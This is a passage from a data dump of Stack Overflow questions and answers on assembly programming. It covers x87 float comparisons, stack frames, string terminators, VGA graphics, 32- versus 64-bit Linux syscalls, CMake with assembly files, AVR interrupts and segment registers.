| ST0 &gt;= ST(i) | X | 0 | JAE | As long as CF is clear we are good |
| ST0 &gt; ST(i)  | 0 | 0 | JA  | Both CF and ZF must be clear       |
+--------------+---+---+-----+------------------------------------+
Legend: X: don't care, 0: clear, 1: set
</pre>

<p>In other words the condition codes match those for using unsigned comparisons. The same goes if you're using <code>FMOVcc</code>.</p>

<p>If either (or both) operand to <code>fcomi</code> is NaN, it sets <code>ZF=1 PF=1 CF=1</code>.  (FP compares have 4 possible results: <code>&gt;</code>, <code>&lt;</code>, <code>==</code>, or unordered).  If you care what your code does with NaNs, you may need an extra <code>jp</code> or <code>jnp</code>.  But not always: for example, <code>ja</code> is only true if CF=0 and ZF=0, so it will be not-taken in the unordered case.  If you want the unordered case to take the same execution path as below or equal, then <code>ja</code> is all you need.</p>

<hr>

<p>Here you should use <code>JA</code> if you want it to print (ie. <code>if (!(f2 &gt; f1)) { puts(""hello""); }</code>) and <code>JBE</code> if you don't (corresponds to <code>if (!(f2 &lt;= f1)) { puts(""hello""); }</code>). (Note this might be a little confusing due to the fact that we only print if we don't jump).</p>

<hr>

<p>Regarding your second question: by default <code>fcomi</code> doesn't pop anything. You want its close cousin <code>fcomip</code> which pops <code>%st0</code>. You should always clear the fpu register stack after usage, so all in all your program ends up like this assuming you want the message printed:</p>

<pre><code>.section    .rodata
msg:    .ascii ""Hallo\n\0""
f1:     .float 10.0
f2:     .float 9.0 

.globl main
    .type   main, @function
main:
    flds   f1
    flds   f2
    fcomip
    fstp   %st(0) # to clear stack
    ja     leb # won't jump, jbe will
    pushl  $msg
    call   printf
    addl   $4, %esp
leb:
    pushl  $0
    call   exit
</code></pre>
","7057771"
"Drawing a stack frame for x86 assembly","10441","","<p>So, I am kind of confused about drawing a stack frame for my assembly code.
I have a feeling I started out wrong.</p>

<p>Here is what I got so far, but as you can see I am confused at step 5, because I think my initial layout is wrong.</p>

<p><img src=""https://i.stack.imgur.com/qncLL.png"" alt=""enter image description here"">
<img src=""https://i.stack.imgur.com/giFmp.png"" alt=""enter image description here""></p>

<p>Can you tell me where I went wrong?</p>
","<p>I think I'd start with a diagram that showed some (semi-)arbitrary amount of empty space at the ""top"" of the stack, and probably display EBP and ESP off to the left, with arrows to show where they're pointing to. I've used solid arrows for ""points to"" and dashed for data movement (in retrospect, it might be better to reverse that).</p>

<p><img src=""https://farm3.static.flickr.com/2759/4442041200_56fdcfafe0_o.jpg"" alt=""alt text""></p>
","2466587"
"What does ""13, 10"" mean in ""DB 13, 10, 'hello world', 0""?","10441","","<p>I've been typing <code>DB 13, 10, 'hello world', 0</code> for a long time without wondering what the 13, the 10 and the 0 were for.</p>

<p>I recently noticed that doing:</p>

<pre><code>PTHIS
DB 'hello world', 0
</code></pre>

<p>produced the same result, so I'm wondering what the first parameters are for and whether is a good idea to simply write it this way. Could someone write a quick explanation on this? (I suppose string declarations would be the topic)</p>
","<p>It's the ASCII CR/LF (carriage return/line feed) sequence, used for advancing to the beginning of the next line.</p>

<blockquote>
  <p><strong>History lesson:</strong> On old teletype machines, carriage return did exactly that, it returned the carriage (printing head) to the start of the current line, while line feed advance the paper so that printing would happen on the next line.</p>
</blockquote>

<p>And your two samples <em>shouldn't</em> produce the same result. If your cursor is not at the start of a line when you output the string without <code>CR/LF</code>, the <code>Hello world</code> will show up mid-line somewhere and, even if you <em>do</em> start at the start of a line, the version with <code>CR/LF</code> should first move the cursor down one row.</p>

<p>The zero at the end is simply a terminator for the string. Some early systems used other characters like the <code>$</code> in the original BIOS:</p>

<pre><code>str   db ""Hello, world$""
</code></pre>

<p>which made it rather a pain to output the <code>$</code> sign to the console :-)</p>

<p>The terminator is there because your string output will almost certainly be written in terms of a character output, such as the pseudo-asm-code:</p>

<pre><code>; func:   out_str
; input:  r1 = address of nul-terminated string
; uses:   out_chr
; reguse: r1, r2 (all restored on exit)
; notes:  none

out_str   push    r1            ; save registers
          push    r2

          push    r1            ; get address to r2 (need r1 for out_chr)
          pop     r2

loop:     ld      r1, (r2)      ; get char, finish if nul
          cmp     r2, 0
          jeq     done

          call    out_chr       ; output char, advance to next, loop back
          incr    r2
          jmp     loop

done:     pop     r2            ; restore registers and return
          pop     r1
          ret

; func:   out_chr
; input:  r1 = character to output
; uses:   nothing
; reguse: none
; notes:  correctly handles control characters

out_chr   ; insert function here to output r1 to screen
</code></pre>
","17266845"
"How to draw a pixel on the screen in protected mode in x86 assembly?","10429","","<p>I am creating a little bootloader+kernel and till now I managed to read disk, load second sector, load GDT, open A20 and enable pmode.</p>

<p>I jumped to the 32-bits function that show me a character on the screen, using the video memory for textual content (0x000B0000 - 0x000B7777)</p>

<pre><code>pusha
mov edi, 0xB8000
mov bl, '.'
mov dl, bl
mov dh, 63
mov word [edi], dx
popa
</code></pre>

<p>Now, I would like to go a little further and draw a single pixel on the screen. As I read on some website, if I want to use the graphics mode of the VGA, I have to write my pixel at location 0x000A0000. Is that right?</p>

<p>Now, what is the format of a single pixel? For a single character you need ASCII code and attribute, but what do you need to define a pixel (if it works the same way as the textual mode)?</p>
","<p>Unfortunately, it's a little more than a little further.</p>

<p>The rules for writing to video memory depend on the graphics mode. Among traditional video modes, VGA mode 320x200 (8bpp) is the only one where video memory behaves like a normal kind of memory: you write a byte corresponding to a pixel you want to the video buffer starting from 0xA000:0000 (or 0xA0000 linear), and that's all.</p>

<p>For other VGA (pre-SVGA) modes, the rules are more complicated: when you write a byte to video memory, you address a group of pixels, and some VGA registers which I have long since forgotten specify which <em>planes</em> of those pixels are updated and how the old value of them is used. It's not just <em>memory</em> any more.</p>

<p>There are SVGA modes (starting with 800x600x8bpp); you can switch to them in a hardware-independent way using <a href=""http://en.wikipedia.org/wiki/VESA_BIOS_Extensions"" rel=""noreferrer"">VESA Video Bios Extensions</a>. In those modes, video memory behaves like memory again, with 1,2,3 or 4 bytes per pixel and no VGA-like 8-pixel groups which you touch with one byte access. The problem is that the real-mode video buffer is not large enough any more to address the whole screen.</p>

<p>VESA VBE 1.2 addressed this problem by providing functions to modify the <em>memory window base</em>: in any particular moment, the segment at linear 0xA0000 is addressing 64Kb region of video memory, but you can control <em>which</em> 64Kb of the whole <em>framebuffer</em> are available at this address (minimal unit of base address adjustment, a.k.a <em>window granularity</em>, depends on the hardware, but you can rely on the ability to map N*64Kb offset at 0xA0000). The downside is that it requires VBE BIOS call each time when you start working with different 64Kb chunk.</p>

<p>VESA VBE 2.0 added flat framebuffer, available at some high address in protected mode (also in <a href=""http://en.wikipedia.org/wiki/Unreal_mode"" rel=""noreferrer"">unreal mode</a>). Thus VBE BIOS call is required for entering video mode, but not for drawing pixels.</p>

<p>VESA VBE 3.0, which might not be portable enough yet, provides a way to call VBE functions in protected mode. (I didn't have a chance to try it, it was not there during my ""OS in assembly"" age).</p>

<p>Anyway, you have to <em>switch</em> to graphics mode first. There are several variants of doing that:</p>

<ul>
<li>The easiest thing to do is to use a BIOS call before you enter protected mode. With VBE 2.0, you won't need video memory window adjustment calls.</li>
<li>Another way is creating a V8086-mode environment which is good enough for BIOS. The hardest part is forwarding interrupts to real-mode interrupt handlers. It's not easy, but when it's done, you'll be able to switch video modes in PM and use some other BIOS functions (for disk I/O, for example).</li>
<li>Yet another way is to use VESA VBE 3.0 protected mode interface. No idea on how easy or complicated it might be.</li>
<li>And a real Jedi way is digging out the information on your specific video card, switching modes by setting its registers. Been there, done that for some Cirrus card in the past -- getting big plain framebuffer in PM was not too complicated. It's unportable, but maybe it's just what you need if the aim is understanding the internals of your machine.</li>
</ul>
","14419528"
"Running 32 bit assembly code on a 64 bit Linux & 64 bit Processor : Explain the anomaly","10428","","<p>I'm in an interesting problem.I forgot I'm using 64bit machine &amp; OS and wrote a 32 bit assembly code. I don't know how to write 64 bit code.</p>

<p>This is the x86 32-bit assembly code for Gnu Assembler (AT&amp;T syntax) on Linux. </p>

<pre><code>//hello.S
#include &lt;asm/unistd.h&gt;
#include &lt;syscall.h&gt;
#define STDOUT 1

.data
hellostr:
    .ascii ""hello wolrd\n"";
helloend:

.text
.globl _start

_start:
    movl $(SYS_write) , %eax  //ssize_t write(int fd, const void *buf, size_t count);
    movl $(STDOUT) , %ebx
    movl $hellostr , %ecx
    movl $(helloend-hellostr) , %edx
    int $0x80

    movl $(SYS_exit), %eax //void _exit(int status);
    xorl %ebx, %ebx
    int $0x80

    ret
</code></pre>

<p>Now, This code should run fine on a 32bit processor &amp; 32 bit OS right? As we know 64 bit processors are backward compatible with 32 bit processors. So, that also wouldn't be a problem. The problem arises because of differences in system calls &amp; call mechanism in 64-bit OS &amp; 32-bit OS.  I don't know why but they changed the system call numbers between 32-bit linux &amp; 64-bit linux. </p>

<p>asm/unistd_32.h defines:</p>

<pre><code>#define __NR_write        4
#define __NR_exit         1
</code></pre>

<p>asm/unistd_64.h defines:</p>

<pre><code>#define __NR_write              1
#define __NR_exit               60
</code></pre>

<p>Anyway using Macros instead of direct numbers is paid off. Its  ensuring correct system call numbers.</p>

<p>when I assemble &amp; link &amp; run the program.</p>

<pre><code>$cpp hello.S hello.s //pre-processor
$as hello.s -o hello.o //assemble
$ld hello.o // linker : converting relocatable to executable
</code></pre>

<p>Its not printing <code>helloworld</code>.</p>

<p>In gdb its showing:</p>

<ul>
<li>Program exited with code 01.</li>
</ul>

<p>I don't know how to debug in gdb. using tutorial I tried to debug it and execute instruction by instruction checking registers at each step. its always showing me ""program exited with 01"". It would be great if some on could show me how to debug this.</p>

<pre><code>(gdb) break _start
Note: breakpoint -10 also set at pc 0x4000b0.
Breakpoint 8 at 0x4000b0
(gdb) start
Function ""main"" not defined.
Make breakpoint pending on future shared library load? (y or [n]) y
Temporary breakpoint 9 (main) pending.
Starting program: /home/claws/helloworld 

Program exited with code 01.
(gdb) info breakpoints 
Num     Type           Disp Enb Address            What
8       breakpoint     keep y   0x00000000004000b0 &lt;_start&gt;
9       breakpoint     del  y   &lt;PENDING&gt;          main
</code></pre>

<p>I tried running <code>strace</code>. This is its output:</p>

<pre><code>execve(""./helloworld"", [""./helloworld""], [/* 39 vars */]) = 0
write(0, NULL, 12 &lt;unfinished ... exit status 1&gt;
</code></pre>

<ol>
<li>Explain the parameters of <code>write(0, NULL, 12)</code> system call in the output of strace?</li>
<li>What <strong>exactly</strong> is happening? I want to know the reason why <strong>exactly</strong> its exiting with exitstatus=1?</li>
<li>Can some one please show me how to debug this program using gdb?</li>
<li>Why did they change the system call numbers?</li>
<li>Kindly change this program appropriately so that it can run correctly on this machine.</li>
</ol>

<p><strong>EDIT:</strong></p>

<p>After reading Paul R's answer. I checked my files</p>

<pre><code>claws@claws-desktop:~$ file ./hello.o 
./hello.o: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), not stripped

claws@claws-desktop:~$ file ./hello
./hello: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, not stripped
</code></pre>

<p>I agree with him that these should be ELF 32-bit relocatable &amp; executable. But that doesn't answer my my questions. All of my questions still questions. What exactly is happening in this case? Can someone please answer my questions and provide an x86-64 version of this code?</p>
","<p>Remember that everything by default on a 64-bit OS tends to assume 64-bit. You need to make sure that you are (a) using the 32-bit versions of your #includes where appropriate (b) linking with 32-bit libraries and (c) building a 32-bit executable. It would probably help if you showed the contents of your makefile if you have one, or else the commands that you are using to build this example.</p>

<p>FWIW I changed your code slightly (_start -> main):</p>

<pre><code>#include &lt;asm/unistd.h&gt;
#include &lt;syscall.h&gt;
#define STDOUT 1

    .data
hellostr:
    .ascii ""hello wolrd\n"" ;
helloend:

    .text
    .globl main

main:
    movl $(SYS_write) , %eax  //ssize_t write(int fd, const void *buf, size_t count);
    movl $(STDOUT) , %ebx
    movl $hellostr , %ecx
    movl $(helloend-hellostr) , %edx
    int $0x80

    movl $(SYS_exit), %eax //void _exit(int status);
    xorl %ebx, %ebx
    int $0x80

    ret
</code></pre>

<p>and built it like this:</p>

<pre><code>$ gcc -Wall test.S -m32 -o test
</code></pre>

<p>verfied that we have a 32-bit executable:</p>

<pre><code>$ file test
test: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), for GNU/Linux 2.6.4, dynamically linked (uses shared libs), not stripped
</code></pre>

<p>and it appears to run OK:</p>

<pre><code>$ ./test
hello wolrd
</code></pre>
","2500944"
"Mixing C and assembly sources and build with cmake","10421","","<p>I'm using eclipse for building a avr-gcc project that mixes assembly code and C source files.
I want to get rid of the automatic makefile generation of eclipse because I need to automate some process into the makefiles and for other reasons.</p>

<p>I used cmake some times ago and I was happy with it so I want to try to compile my source files using it. Everything run as expected with C sources. The problem is that at the end I need to compile some assembly files (actually 2) and add them to the target.</p>

<p>I googled around but I didn't found a way for doing this. 
someone have an idea on how to do this?</p>

<p>The problem is that in eclipse I have
    -x assembler-with-cpp</p>

<p>added to gcc argument list. I need to find a way for selectively add this param to the standard gcc argument list only for the asm files. I didn't find around any way for doing this. </p>

<p>thank you in advance</p>

<p>SOLUTION:
set in CMakeLists.txt every file to compile in the same list</p>

<pre><code>enable_language(C ASM)

set ( SOURCES 
    foo.c
    bar.c
    foobar.s
)

add_executable(program  ${SOURCES} ) 
</code></pre>

<p>in the Toolchain file you should place:</p>

<pre><code>SET(ASM_OPTIONS ""-x assembler-with-cpp"")
SET(CMAKE_ASM_FLAGS ""${CFLAGS} ${ASM_OPTIONS}"" )
</code></pre>

<p>the second line is just if you need to pass extra options while compiling asm files. I wanted to pass all the CFLAGS plus some ASM_OPTIONS</p>
","<p>CMake 2.8 should support assembler out of the box. Just be sure to enable the ""ASM"" language in your project. If an assembler source file needs preprocessing, also set the source file's compilation flag:</p>

<pre><code>project(assembler C ASM)
set_source_files_properties(foo.s PROPERTIES COMPILE_FLAGS ""-x assembler-with-cpp"")
add_executable(hello foo.s bar.c)
</code></pre>
","15139210"
"teaching my self Z/OS assembler?","10392","","<p>'I've interned at a company that does a lot of mainframe work. Most of my mainframe experience has been using Java and Unix System Services. I've had some experience with the ISPF interface and C but none with assembler. I’m graduating shortly and will be taking an independent study my last semester. I’d like to stick with the mainframe and was wondering what resources could teach me mainframe assembler? Note I don’t have experience writing assembler for any platform but do understand binary, hex, and have a theoretical understanding of registers.</p>
","<p>I've been able to teach myself the very basics using the following material along with co-workers who I can ask questions of. For an easy way to run and debug basic assembly programs I use the <a href=""http://www.z390.org"" rel=""nofollow noreferrer"">Z390</a> emulator with the option allowing use of the assist instructions as well as the test option for interactive debugging. I've used <a href=""http://www.wiu.edu/users/mflll/cs310/head.html"" rel=""nofollow noreferrer"">this</a> as the main introductory tutorial. I've used <a href=""http://www.jorjabrown.us/csci360.htm"" rel=""nofollow noreferrer"">this</a> class site as another reference. Finally these <a href=""http://www.kcats.org/share/"" rel=""nofollow noreferrer"">Share</a> materials may be useful although I don't know how good they are since they aren't very accessible with my screen reader.</p>
","2402541"
"Understand the assembly code generated by a simple C program","10386","","<p>I am trying to understand the assembly level code for a simple C program by inspecting it with gdb's disassembler.</p>

<p>Following is the C code:</p>

<pre><code>#include &lt;stdio.h&gt;

void function(int a, int b, int c) {
   char buffer1[5];
   char buffer2[10];
}

void main() {
  function(1,2,3);
}
</code></pre>

<p>Following is the disassembly code for both <code>main</code> and <code>function</code></p>

<pre><code>gdb) disass main
Dump of assembler code for function main:
0x08048428 &lt;main+0&gt;:    push   %ebp
0x08048429 &lt;main+1&gt;:    mov    %esp,%ebp
0x0804842b &lt;main+3&gt;:    and    $0xfffffff0,%esp
0x0804842e &lt;main+6&gt;:    sub    $0x10,%esp
0x08048431 &lt;main+9&gt;:    movl   $0x3,0x8(%esp)
0x08048439 &lt;main+17&gt;:   movl   $0x2,0x4(%esp)
0x08048441 &lt;main+25&gt;:   movl   $0x1,(%esp)
0x08048448 &lt;main+32&gt;:   call   0x8048404 &lt;function&gt;
0x0804844d &lt;main+37&gt;:   leave  
0x0804844e &lt;main+38&gt;:   ret
End of assembler dump.

(gdb) disass function
Dump of assembler code for function function:
0x08048404 &lt;function+0&gt;:    push   %ebp
0x08048405 &lt;function+1&gt;:    mov    %esp,%ebp
0x08048407 &lt;function+3&gt;:    sub    $0x28,%esp
0x0804840a &lt;function+6&gt;:    mov    %gs:0x14,%eax
0x08048410 &lt;function+12&gt;:   mov    %eax,-0xc(%ebp)
0x08048413 &lt;function+15&gt;:   xor    %eax,%eax
0x08048415 &lt;function+17&gt;:   mov    -0xc(%ebp),%eax
0x08048418 &lt;function+20&gt;:   xor    %gs:0x14,%eax
0x0804841f &lt;function+27&gt;:   je     0x8048426 &lt;function+34&gt;
0x08048421 &lt;function+29&gt;:   call   0x8048340 &lt;__stack_chk_fail@plt&gt;
0x08048426 &lt;function+34&gt;:   leave  
0x08048427 &lt;function+35&gt;:   ret    
End of assembler dump.
</code></pre>

<p>I am seeking answers for following things :</p>

<ol>
<li>how the addressing is working , I mean (main+0) , (main+1), (main+3)</li>
<li>In the main, why is $0xfffffff0,%esp being used</li>
<li>In the function, why is %gs:0x14,%eax ,  %eax,-0xc(%ebp) being used.</li>
<li>If someone can explain , step by step happening, that will be greatly appreciated.</li>
</ol>
","<p>The reason for the ""strange"" addresses such as <code>main+0</code>, <code>main+1</code>, <code>main+3</code>, <code>main+6</code> and so on, is because each instruction takes up a variable number of bytes. For example:</p>

<pre><code>main+0: push %ebp
</code></pre>

<p>is a one-byte instruction so the next instruction is at <code>main+1</code>. On the other hand,</p>

<pre><code>main+3: and $0xfffffff0,%esp
</code></pre>

<p>is a three-byte instruction so the next instruction after that is at <code>main+6</code>.</p>

<p>And, since you ask in the comments why <code>movl</code> seems to take a variable number of bytes, the explanation for that is as follows.</p>

<p>Instruction length depends not only on the <em>opcode</em> (such as <code>movl</code>) but also the addressing modes for the <em>operands</em> as well (the things the opcode are operating on). I haven't checked specifically for your code but I suspect the</p>

<pre><code>movl $0x1,(%esp)
</code></pre>

<p>instruction is probably shorter because there's no offset involved - it just uses <code>esp</code> as the address. Whereas something like:</p>

<pre><code>movl $0x2,0x4(%esp)
</code></pre>

<p>requires everything that <code>movl $0x1,(%esp)</code> does, <em>plus</em> an extra byte for the offset <code>0x4</code>.</p>

<p>In fact, here's a debug session showing what I mean:</p>

<pre><code>Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

c:\pax&gt; debug
-a
0B52:0100 mov word ptr [di],7
0B52:0104 mov word ptr [di+2],8
0B52:0109 mov word ptr [di+0],7
0B52:010E
-u100,10d
0B52:0100 C7050700      MOV     WORD PTR [DI],0007
0B52:0104 C745020800    MOV     WORD PTR [DI+02],0008
0B52:0109 C745000700    MOV     WORD PTR [DI+00],0007
-q
c:\pax&gt; _
</code></pre>

<p>You can see that the second instruction with an offset is actually different to the first one without it. It's one byte longer (5 bytes instead of 4, to hold the offset) and actually has a different encoding <code>c745</code> instead of <code>c705</code>.</p>

<p>You can also see that you can encode the first and third instruction in two different ways but they basically do the same thing.</p>

<hr>

<p>The <code>and $0xfffffff0,%esp</code> instruction is a way to force <code>esp</code> to be on a specific boundary. This is used to ensure proper alignment of variables. Many memory accesses on modern processors will be more efficient if they follow the alignment rules (such as a 4-byte value having to be aligned to a 4-byte boundary). Some modern processors will even raise a fault if you don't follow these rules.</p>

<p>After this instruction, you're guaranteed that <code>esp</code> is both less than or equal to its previous value <em>and</em> aligned to a 16 byte boundary.</p>

<hr>

<p>The <code>gs:</code> prefix simply means to use the <code>gs</code> segment register to access memory rather than the default.</p>

<p>The instruction <code>mov %eax,-0xc(%ebp)</code> means to take the contents of the <code>ebp</code> register, subtract 12 (<code>0xc</code>) and then put the value of <code>eax</code> into that memory location.</p>

<hr>

<p>Re the explanation of the code. Your <code>function</code> function is basically one big no-op. The assembly generated is limited to stack frame setup and teardown, along with some stack frame corruption checking which uses the afore-mentioned <code>%gs:14</code> memory location.</p>

<p>It loads the value from that location (probably something like <code>0xdeadbeef</code>) into the stack frame, does its job, then checks the stack to ensure it hasn't been corrupted.</p>

<p>Its job, in this case, is nothing. So all you see is the function administration stuff. </p>

<p>Stack set-up occurs between <code>function+0</code> and <code>function+12</code>. Everything after that is setting up the return code in <code>eax</code> and tearing down the stack frame, including the corruption check.</p>

<p>Similarly, <code>main</code> consist of stack frame set-up, pushing the parameters for <code>function</code>, calling <code>function</code>, tearing down the stack frame and exiting.</p>

<p>Comments have been inserted into the code below:</p>

<pre><code>0x08048428 &lt;main+0&gt;:    push   %ebp                 ; save previous value.
0x08048429 &lt;main+1&gt;:    mov    %esp,%ebp            ; create new stack frame.
0x0804842b &lt;main+3&gt;:    and    $0xfffffff0,%esp     ; align to boundary.
0x0804842e &lt;main+6&gt;:    sub    $0x10,%esp           ; make space on stack.

0x08048431 &lt;main+9&gt;:    movl   $0x3,0x8(%esp)       ; push values for function.
0x08048439 &lt;main+17&gt;:   movl   $0x2,0x4(%esp)
0x08048441 &lt;main+25&gt;:   movl   $0x1,(%esp)
0x08048448 &lt;main+32&gt;:   call   0x8048404 &lt;function&gt; ; and call it.

0x0804844d &lt;main+37&gt;:   leave                       ; tear down frame.
0x0804844e &lt;main+38&gt;:   ret                         ; and exit.

0x08048404 &lt;func+0&gt;:    push   %ebp                 ; save previous value.
0x08048405 &lt;func+1&gt;:    mov    %esp,%ebp            ; create new stack frame.
0x08048407 &lt;func+3&gt;:    sub    $0x28,%esp           ; make space on stack.
0x0804840a &lt;func+6&gt;:    mov    %gs:0x14,%eax        ; get sentinel value.
0x08048410 &lt;func+12&gt;:   mov    %eax,-0xc(%ebp)      ; put on stack.

0x08048413 &lt;func+15&gt;:   xor    %eax,%eax            ; set return code 0.

0x08048415 &lt;func+17&gt;:   mov    -0xc(%ebp),%eax      ; get sentinel from stack.
0x08048418 &lt;func+20&gt;:   xor    %gs:0x14,%eax        ; compare with actual.
0x0804841f &lt;func+27&gt;:   je     &lt;func+34&gt;            ; jump if okay.
0x08048421 &lt;func+29&gt;:   call   &lt;_stk_chk_fl&gt;        ; otherwise corrupted stack.
0x08048426 &lt;func+34&gt;:   leave                       ; tear down frame.
0x08048427 &lt;func+35&gt;:   ret                         ; and exit.
</code></pre>

<hr>

<p>I think the reason for the <code>%gs:0x14</code> may be evident from above but, just in case, I'll elaborate here.</p>

<p>It uses this value (a sentinel) to put in the current stack frame so that, should something in the function do something silly like write 1024 bytes to a 20-byte array created on the stack or, in your case:</p>

<pre><code>char buffer1[5];
strcpy (buffer1, ""Hello there, my name is Pax."");
</code></pre>

<p>then the sentinel will be overwritten and the check at the end of the function will detect that, calling the failure function to let you know, and then probably aborting so as to avoid any other problems.</p>

<p>If it placed <code>0xdeadbeef</code> onto the stack and this was changed to something else, then an <code>xor</code> with <code>0xdeadbeef</code> would produce a non-zero value which is detected in the code with the <code>je</code> instruction.</p>

<p>The relevant bit is paraphrased here:</p>

<pre><code>          mov    %gs:0x14,%eax     ; get sentinel value.
          mov    %eax,-0xc(%ebp)   ; put on stack.

          ;; Weave your function
          ;;   magic here.

          mov    -0xc(%ebp),%eax   ; get sentinel back from stack.
          xor    %gs:0x14,%eax     ; compare with original value.
          je     stack_ok          ; zero/equal means no corruption.
          call   stack_bad         ; otherwise corrupted stack.
stack_ok: leave                    ; tear down frame.
</code></pre>
","3654978"
"Preserving sreg in AVR interrupts","10284","","<p>What is the mechanism used to preserve the status register, sreg, in an AVR microcontroller?  <code>RETI</code> implies that these bits are not on the stack.  Is one of the general purpose registers also the sreg or something like that?</p>
","<p>This is explained in every AVR datasheet. For example on page 8 of the <a href=""http://www.atmel.com/dyn/resources/prod_documents/doc2543.pdf"">ATtiny2313 datasheet</a> it says:</p>

<blockquote>
  <p>The Status Register is not automatically stored when entering an interrupt routine and restored when returning from an interrupt. This must be handled by software.</p>
</blockquote>

<p>You can achieve this by storing it in a temporary register:</p>

<pre><code> interrupt:
     in r16, SREG   ; save SREG

     ...

     out SREG, r16  ; restore SREG
     reti
</code></pre>

<p>Also note that if you're accessing registers that are not exclusively used in this interrupt routine, you need to save those, too. Furthermore you can push the value of SREG to the stack if you're low on registers:</p>

<pre><code> interrupt:
     push r16      ; save global registers on stack
     push r17
     push r18
     in r16, SREG  ; save SREG
     push r16      ; do this if you want to use r16 in your interrupt routine

     ...

     pop r16       ; do this if you pushed SREG above
     out SREG, r16 ; restore SREG
     pop r18       ; restore global registers
     pop r17
     pop r16
     reti
</code></pre>

<p>For more information look <a href=""http://www.avr-asm-tutorial.net/avr_en/beginner/JUMP.html#Ints"">here</a>.</p>
","8907790"
"run an assembly code on ubuntu","10279","","<p>The code i am trying to run is bellow.
I use nasm util to convert it into object file. When i tried to execute it says ""can not execute binary file"".</p>

<p>I run the command:
nasm -f elf -o helloworld.o helloworld.asm</p>

<pre><code>segment .data
msg  db   ""Hello, world!"",10
len  equ  $ - msg

segment .text
global _start

_start:
   mov  eax,4
   mov  ebx,1
   mov  ecx,msg
   mov  edx,len
   int  80h

   mov  eax,1
   mov  ebx,0
   int  80h
</code></pre>

<p>it is my first program in assembly and i did not use ubuntu except compiling some<br>
basic c programs. i need some help thanks all.</p>
","<p>It works perfectly for me your code.</p>

<p>Did you link the final object file?</p>

<p>Try this: <code>ld helloworld.o -o helloworld</code></p>
","3909887"
"Mixing C and Assembly files","10267","","<p>I want to use a <a href=""http://msdn.microsoft.com/en-us/library/5ekezyy2%28v=vs.80%29.aspx"" rel=""noreferrer"">naked function</a> in my C++ program using g++. Unfortunately g++, unlike VC++, does not support naked functions and the only way to manage this is to write your own assembly code in a separate file and link with your C++ files. I tried to find some good tutorial for x86 to mix assembly and C/C++ files but couldn't find any good one.</p>

<p>Kindly let me know if you know about any. Note that I'm not asking about inline assembly but linking C and assembly files and ways to declare extern variables of C in assembly and vice versa besides using them in either C or assembly, and also ways to link the C and asm files using Makefile.</p>
","<p>In C++ file:</p>

<pre><code>extern ""C"" void foo(); // Stop name mangling games

int main() {
  foo();
}
</code></pre>

<p>in ""naked"" asm file, for x86:</p>

<pre><code># modified from http://asm.sourceforge.net/howto/hello.html

.text                   # section declaration
    .global foo

foo:

# write our string to stdout

    movl    $len,%edx   # third argument: message length
    movl    $msg,%ecx   # second argument: pointer to message to write
    movl    $1,%ebx     # first argument: file handle (stdout)
    movl    $4,%eax     # system call number (sys_write)
    int $0x80       # call kernel

# and exit

    movl    $0,%ebx     # first argument: exit code
    movl    $1,%eax     # system call number (sys_exit)
    int $0x80       # call kernel

.data                   # section declaration

msg:
    .ascii  ""Hello, world!\n""   # our dear string
    len = . - msg           # length of our dear string
</code></pre>

<p>Compile, assemble and link (with g++ rather than ld because it's much easier to do it that way for C++) and run:</p>

<pre><code>ajw@rapunzel:/tmp &gt; g++ -Wall -Wextra test.cc -c -o test.o
ajw@rapunzel:/tmp &gt; as -o asm.o asm.S
ajw@rapunzel:/tmp &gt; g++ test.o asm.o
ajw@rapunzel:/tmp &gt; ./a.out
Hello, world!
</code></pre>

<p>Clearly if you want to pass arguments to your function or return anything you need to respect the calling conventions.</p>
","8054507"
"8086- why can't we move an immediate data into segment register?","10264","","<p>In 8086 assembly programming, we can only load a data into a segment register by, first loading it into a general purpose register and then we have to move it from this general register to the segment register.</p>

<p>Why can't we load it directly? Is there any special reason for not being allowed? </p>

<p>What is the difference between <code>mov ax,5000H</code> and <code>mov ax,[5000H]</code>? Does <code>[5000h]</code> mean content in memory location 5000h? </p>
","<p>Remember that the syntax of assembly language (any assembly) is just a human-readable way to write machine code. The rules of what you can do in machine code depend on how the processor's electronics were designed, not on what the assembler syntax could easily support.</p>

<p>So, just because it looks like you could write <code>mov DS, [5000h]</code> and that conceptually it doesn't seem like there is a reason why you shouldn't be able to do it, it's really about ""is there a mechanism by which the processor can load a segment register from a memory location's content?""</p>

<p>In the case of 8086 assembly, I figure that the reason is simply that the engineers just didn't create an electric path that could feed a signal from the memory I/O data lines to the lines that write to the segment registers.</p>

<hr>

<p>Why? I have several theories, but no authoritative knowledge.</p>

<p>The most likely reason is simply one of simplifying the design: it takes extra wiring and gates to do that, and it's an uncommon enough operation (this is the 70's) that it's not worth the real estate in the chip. This is not surprising; the 8086 already went overboard allowing any of the normal registers to be connected to the ALU (arithmetic logic unit) which allows any register to be used as an accumulator. I'm sure that wasn't cheap to do. Most processors at the time only allowed one register (<em>the</em> accumulator) to be used for that purpose.</p>

<p>It's also possible that allowing a segment register to be written from a memory read resulted in several weird edge cases that were hard to get right in the circuitry. After all, the segment register to be written might be used to address the source operand.</p>

<hr>

<p><strong>As far as the brackets</strong>, you are correct. Let's say memory position 5000h contains the number 4321h. <code>mov ax, 5000h</code> puts the value 5000h into ax, while <code>mov ax, [5000h]</code> loads 4321h from memory into ax. Essentially, the brackets act like the <code>*</code> pointer dereference operator in C.</p>

<p>Just to highlight the fact that assembly is an idealized abstraction of what machine code can do, you should note that the two variations are not the same instruction with different parameters, but completely different opcodes. They could have used – say – <code>MOV</code> for the first and <code>MVD</code> (MoVe Direct addressed memory) for the second opcode, but they must have decided that the bracket syntax was easier for programmers to remember.</p>
","19074925"
"#include header with C declarations in an assembly file without errors?","10263","","<p>I have an assembly file (<code>asm.S</code>) which needs a constant <code>#define</code>'d in a C header file (<code>c_decls.h</code>).  The header file contains C function declarations in addition to the <code>#define</code> I want.  Unfortunately, <code>gcc</code> barfs when trying to compile the assembly file.  For example,</p>

<p><strong>c_decls.h</strong></p>

<pre><code>#ifndef __c_decls_h__
#define __c_decls_h__

#define I_NEED_THIS 0xBEEF
int foo(int bar);

#endif
</code></pre>

<p><strong>asm.S</strong></p>

<pre><code>#include ""c_decls.h""

.globl main
main:
    pushl %ebp
    movl %esp, %ebp
    movl $I_NEED_THIS, %eax
    leave
    ret
</code></pre>

<p><strong>Output</strong></p>

<blockquote>
  <p>> gcc -m32 asm.S<br>
  c_decls.h: Assembler messages:<br>
  c_decls.h:6: Error: junk '(int bar)' after expression<br>
